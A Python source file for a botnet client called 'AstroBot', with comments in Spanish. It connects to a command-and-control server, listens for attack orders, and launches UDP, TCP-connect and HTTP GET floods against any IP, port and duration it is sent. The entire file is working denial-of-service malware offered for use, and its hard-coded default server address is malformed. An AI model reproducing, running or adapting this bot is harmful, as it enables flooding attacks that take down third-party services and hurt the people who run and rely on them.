#!/usr/bin/env python3
import socket
import threading
import random
import time
import sys

class AstroBot:
    def __init__(self, cnc_ip="127.0.0.1", cnc_port=1337):
        self.cnc_ip = cnc_ip
        self.cnc_port = cnc_port
        self.running = True
        self.attacks = {
            "UDP": self.udp_flood,
            "TCP": self.tcp_flood,
            "HTTP": self.http_flood
        }

    def connect(self):
        """Conecta al CNC y escucha comandos."""
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((self.cnc_ip, self.cnc_port))
                print("[*] Conectado al CNC. Esperando comandos...")
                
                while self.running:
                    cmd = sock.recv(1024).decode().strip()
                    if not cmd:
                        break
                    self.process_command(cmd, sock)
                
            except Exception as e:
                print(f"[!] Error: {e}. Reconectando en 5s...")
                time.sleep(5)

    def process_command(self, cmd, sock):
        """Procesa comandos del CNC."""
        if cmd == "PING":
            sock.send("PONG".encode())
            return

        if cmd.startswith("!"):
            parts = cmd[1:].split()
            if len(parts) < 4:
                return

            method = parts[0].upper()
            if method in self.attacks:
                ip = parts[1]
                port = int(parts[2])
                duration = int(parts[3])
                print(f"[+] Atacando {ip}:{port} ({method} durante {duration}s")
                thread = threading.Thread(
                    target=self.attacks[method],
                    args=(ip, port, duration)
                )
                thread.daemon = True
                thread.start()

    # ===== MÉTODOS DE ATAQUE =====
    def udp_flood(self, ip, port, duration):
        """UDP Flood optimizado."""
        end_time = time.time() + duration
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while time.time() < end_time and self.running:
            try:
                payload = random._urandom(1024)  # Paquetes de 1KB
                sock.sendto(payload, (ip, port))
            except:
                pass
        sock.close()

    def tcp_flood(self, ip, port, duration):
        """TCP Flood (conexiones masivas)."""
        end_time = time.time() + duration
        while time.time() < end_time and self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((ip, port))
                s.close()
            except:
                pass

    def http_flood(self, ip, port, duration):
        """HTTP Flood (GET requests)."""
        end_time = time.time() + duration
        while time.time() < end_time and self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((ip, port))
                request = f"GET / HTTP/1.1\r\nHost: {ip}\r\n\r\n"
                s.send(request.encode())
                s.close()
            except:
                pass

if __name__ == "__main__":
    if len(sys.argv) > 1:
        bot = AstroBot(cnc_ip=sys.argv[1], cnc_port=int(sys.argv[2]))
    else:
        bot = AstroBot(cnc_ip="181.2.28292.", cnc_port=1337)  # Cambia por tu IP
    
    bot.connect()
